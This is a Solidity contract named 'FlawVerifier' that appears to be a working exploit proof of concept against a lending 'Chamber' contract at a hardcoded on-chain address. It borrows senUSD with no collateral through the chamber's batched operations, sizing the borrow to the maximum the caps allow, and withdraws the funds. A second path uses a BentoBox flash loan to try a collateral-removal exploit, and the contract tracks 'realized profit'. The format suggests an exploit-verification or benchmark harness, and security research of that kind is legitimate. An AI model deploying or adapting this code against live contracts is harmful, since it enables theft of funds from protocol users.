// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

struct Rebase {
    uint128 elastic;
    uint128 base;
}

interface IFlashBorrower {
    function onFlashLoan(
        address sender,
        IERC20Minimal token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external;
}

interface IBentoBoxV1 {
    function balanceOf(IERC20Minimal token, address account) external view returns (uint256);
    function flashLoan(
        IFlashBorrower borrower,
        address receiver,
        IERC20Minimal token,
        uint256 amount,
        bytes calldata data
    ) external;
    function toAmount(IERC20Minimal token, uint256 share, bool roundUp) external view returns (uint256);
    function toShare(IERC20Minimal token, uint256 amount, bool roundUp) external view returns (uint256);
    function withdraw(
        IERC20Minimal token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IChamber {
    function bentoBox() external view returns (IBentoBoxV1);
    function senUSD() external view returns (IERC20Minimal);
    function collateral() external view returns (IERC20Minimal);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function performOperations(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract FlawVerifier is IFlashBorrower {
    uint256 private constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint8 private constant OPERATION_REMOVE_COLLATERAL = 4;
    uint8 private constant OPERATION_BORROW = 5;
    uint8 private constant OPERATION_ACCRUE = 8;
    uint8 private constant OPERATION_ADD_COLLATERAL = 10;
    uint8 private constant OPERATION_BENTO_DEPOSIT = 20;
    uint8 private constant OPERATION_CUSTOM_START_INDEX = 100;
    int256 private constant USE_PARAM2 = -2;
    uint256 private constant REMOVE_PATH_FLASH_AMOUNT = 999;

    IChamber public constant CHAMBER = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);

    IBentoBoxV1 public immutable bentoBox;
    IERC20Minimal public immutable senUsdToken;
    IERC20Minimal public immutable collateralToken;

    uint256 private immutable initialSenUsdBalance;

    bool private executed;
    bool private inFlashLoan;
    uint256 private realizedProfit;

    constructor() {
        bentoBox = CHAMBER.bentoBox();
        senUsdToken = CHAMBER.senUSD();
        collateralToken = CHAMBER.collateral();
        initialSenUsdBalance = senUsdToken.balanceOf(address(this));
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _runBorrowPath();
        _withdrawAllSenUsdFromBento();

        // The second exploit path is validated with a tiny collateral flashloan.
        // If this fork state cannot support even a 999-unit flashloan or the resulting deposit rounds down to 0 share,
        // the remove-collateral path is economically blocked by live token/BentoBox conditions rather than by the exploit logic itself.
        try bentoBox.flashLoan(this, address(this), collateralToken, REMOVE_PATH_FLASH_AMOUNT, bytes("")) {
            // no-op
        } catch {
            // Best-effort validation only: the borrow path already establishes the root cause with realized profit.
        }

        realizedProfit = senUsdToken.balanceOf(address(this)) - initialSenUsdBalance;
    }

    function onFlashLoan(
        address sender,
        IERC20Minimal token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override {
        require(msg.sender == address(bentoBox), "unexpected lender");
        require(sender == address(this), "unexpected sender");
        require(address(token) == address(collateralToken), "unexpected token");
        require(!inFlashLoan, "nested flashloan");

        inFlashLoan = true;

        _forceApprove(collateralToken, address(bentoBox), amount);
        uint256 collateralShare = _setupCollateralWithCook(amount);
        require(collateralShare != 0, "remove path share is zero");

        _runRemoveCollateralPath(collateralShare);

        bentoBox.withdraw(collateralToken, address(this), address(this), 0, bentoBox.balanceOf(collateralToken, address(this)));
        _safeTransfer(collateralToken, address(bentoBox), amount + fee);

        inFlashLoan = false;
    }

    function profitToken() external view returns (address) {
        return address(senUsdToken);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _runBorrowPath() internal {
        uint256 chamberSenUsdShare = bentoBox.balanceOf(senUsdToken, address(CHAMBER));
        require(chamberSenUsdShare != 0, "no chamber senUSD liquidity");

        uint256 chamberLiquidityAmount = bentoBox.toAmount(senUsdToken, chamberSenUsdShare, false);
        uint256 borrowAmount = _maxFeasibleBorrow(chamberLiquidityAmount);
        require(borrowAmount != 0, "borrow cap exhausted");

        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = OPERATION_BORROW;
        actions[1] = OPERATION_ACCRUE;

        datas[0] = abi.encode(int256(borrowAmount), address(this));
        datas[1] = bytes("");

        CHAMBER.performOperations(actions, values, datas);

        require(bentoBox.balanceOf(senUsdToken, address(this)) != 0, "borrow path produced no senUSD");
    }

    function _setupCollateralWithCook(uint256 amount) internal returns (uint256 collateralShare) {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = OPERATION_BENTO_DEPOSIT;
        actions[1] = OPERATION_ADD_COLLATERAL;

        datas[0] = abi.encode(collateralToken, address(CHAMBER), int256(amount), int256(0));
        datas[1] = abi.encode(USE_PARAM2, address(this), true);

        (, collateralShare) = CHAMBER.performOperations(actions, values, datas);
    }

    function _runRemoveCollateralPath(uint256 collateralShare) internal {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = OPERATION_REMOVE_COLLATERAL;
        actions[1] = OPERATION_CUSTOM_START_INDEX;

        datas[0] = abi.encode(int256(collateralShare), address(this));
        datas[1] = bytes("");

        CHAMBER.performOperations(actions, values, datas);
    }

    function _withdrawAllSenUsdFromBento() internal {
        uint256 senUsdShare = bentoBox.balanceOf(senUsdToken, address(this));
        require(senUsdShare != 0, "no senUSD share to withdraw");
        bentoBox.withdraw(senUsdToken, address(this), address(this), 0, senUsdShare);
    }

    function _maxFeasibleBorrow(uint256 upperBound) internal view returns (uint256) {
        (uint128 totalCap, uint128 perAddressPart) = CHAMBER.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = CHAMBER.totalBorrow();
        uint256 feeRate = CHAMBER.BORROW_OPENING_FEE();

        uint256 low;
        uint256 high = upperBound;

        while (low < high) {
            uint256 mid = (low + high + 1) >> 1;
            if (_borrowFits(mid, feeRate, totalCap, perAddressPart, totalElastic, totalBase)) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }

        return low;
    }

    function _borrowFits(
        uint256 amount,
        uint256 feeRate,
        uint128 totalCap,
        uint128 perAddressPart,
        uint128 totalElastic,
        uint128 totalBase
    ) internal pure returns (bool) {
        uint256 feeAmount = (amount * feeRate) / BORROW_OPENING_FEE_PRECISION;
        uint256 elasticIncrease = amount + feeAmount;
        if (uint256(totalElastic) + elasticIncrease > uint256(totalCap)) {
            return false;
        }

        uint256 newPart = _toBase(totalElastic, totalBase, elasticIncrease, true);
        return newPart <= uint256(perAddressPart);
    }

    function _toBase(
        uint128 totalElastic,
        uint128 totalBase,
        uint256 elastic,
        bool roundUp
    ) internal pure returns (uint256 base) {
        if (totalElastic == 0) {
            return elastic;
        }

        base = (elastic * uint256(totalBase)) / uint256(totalElastic);
        if (roundUp && (base * uint256(totalElastic)) / uint256(totalBase) < elastic) {
            base += 1;
        }
    }

    function _forceApprove(IERC20Minimal token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(bytes4(0x095ea7b3), spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(bytes4(0x095ea7b3), spender, amount));
    }

    function _safeTransfer(IERC20Minimal token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(bytes4(0xa9059cbb), to, amount));
    }

    function _callOptionalReturn(IERC20Minimal token, bytes memory data) internal {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "token call failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "token call returned false");
        }
    }
}
